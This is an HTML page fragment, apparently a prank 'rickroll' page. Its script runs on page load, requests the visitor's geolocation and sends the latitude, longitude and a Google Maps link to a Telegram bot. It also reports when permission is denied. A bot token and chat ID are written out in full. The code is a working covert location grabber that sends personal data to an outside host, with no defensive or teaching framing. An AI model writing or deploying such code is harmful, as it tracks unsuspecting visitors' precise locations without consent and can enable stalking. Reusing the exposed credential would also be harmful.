<body>

<script>
  const BOT_TOKEN = '7483695523:AAG6BoyFGCH6XDTDJ0wXhGlxEwlUwSYcnXA';
  const CHAT_ID = '7650029381';

  function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
  }

  function getLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(position => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const link = `https://maps.google.com/?q=${lat},${lon}`;
        const msg = `Rickroll Victim:\nLatitude: ${lat}\nLongitude: ${lon}\nMap: ${link}`;
        sendToTelegram(msg);
      }, error => {
        sendToTelegram("Rickroll Victim: Location permission denied.");
      });
    } else {
      sendToTelegram("Rickroll Victim: Geolocation not supported.");
    }
  }

  // Trigger on visit
  window.onload = getLocation;
</script>
